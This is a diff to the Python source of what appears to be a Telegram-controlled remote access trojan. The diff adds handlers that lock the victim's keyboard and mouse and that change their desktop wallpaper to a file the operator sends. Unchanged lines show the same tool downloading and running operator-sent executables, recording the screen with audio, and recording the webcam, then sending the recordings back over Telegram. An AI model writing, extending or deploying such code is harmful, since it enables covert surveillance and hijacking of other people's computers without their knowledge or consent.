@@ -92,6 +92,19 @@ async def open_browser_process(message: Message, state: FSMContext):
     await state.clear()
 
 
+@router.callback_query(F.data == 'block')
+async def open_browser(callback: CallbackQuery, state: FSMContext):
+    """BLOCK KEYB AND MOUSE"""
+    await callback.answer('Hes blocked')
+    await main.block_input(True)
+
+@router.callback_query(F.data == 'unblock')
+async def open_browser(callback: CallbackQuery, state: FSMContext):
+    """UNBLOCK KEYB AND MOUSE"""
+    await callback.answer('Hes unblocked')
+    await main.unblock()
+
+
 @router.callback_query(F.data == 'load')
 async def play_mod(callback: CallbackQuery, state: FSMContext):
     """THIS FUNC LOAD FILE FROM TELEGRAM AND RUN(exe, txt, audio, video) AND MORE"""
@@ -120,6 +133,40 @@ async def play_mod_process(message: Message, state: FSMContext):
     await state.clear()
 
 
+@router.message(F.text == 'Fun')
+async def fun_menu(message: Message):
+    await message.answer('Fun :)', reply_markup=kb.fun_kb)
+
+@router.callback_query(F.data == 'desktop')
+async def change_wallper(callback: CallbackQuery, state: FSMContext):
+    """THIS FUNC CHANGE DESKTOP xD"""
+    await callback.answer('Enter file')
+    await state.set_state(Check.file)
+
+@router.message(Check.file)
+async def change_wallper_process(message: Message, state: FSMContext):
+    file = message.audio or message.voice or message.video or message.document
+
+    if not file:
+        await message.reply("Error file")
+        return
+
+    file_id = file.file_id
+    file_info = await bot.get_file(file_id) 
+    file_extension = file.file_name.split(".")[-1] if hasattr(file, "file_name") else "tmp"
+    
+    file_path = os.path.join(os.getcwd(), f"{file_id}.{file_extension}")
+    await bot.download_file(file_info.file_path, destination=file_path)  
+    
+    await message.reply(f"File hes saved: {file_path}")
+
+    try:
+        wallper = await main.set_wallpaper(file_path)
+        await message.answer(wallper)
+    finally:
+        await main.delete_file(file_path)
+
+    await state.clear()
 
 
 @router.callback_query(F.data == 'screen')
@@ -133,7 +180,7 @@ async def screen(callback: CallbackQuery):
 async def screen_video(callback: CallbackQuery):
     """VIDEO DISPLAY AND SEND TO TELEGRAM"""
     await callback.answer('Video')
-    video_filename, audio_filename = await main.record_screen_and_audio(140)#video in sec
+    video_filename, audio_filename = await main.record_screen_and_audio(100)#video in sec
 
     await callback.message.answer(video_filename)
     await callback.message.answer(audio_filename)
@@ -145,7 +192,7 @@ async def screen_video(callback: CallbackQuery):
 async def screen_web(callback: CallbackQuery):
     """VIDEO FROM WEB CAMERA AND SEND TO TELEGRAM"""
     await callback.answer('Web cam')
-    web_path = await main.record_video(120)#video in sec
+    web_path = await main.record_video(100)#video in sec
 
     await callback.message.answer(web_path)
 
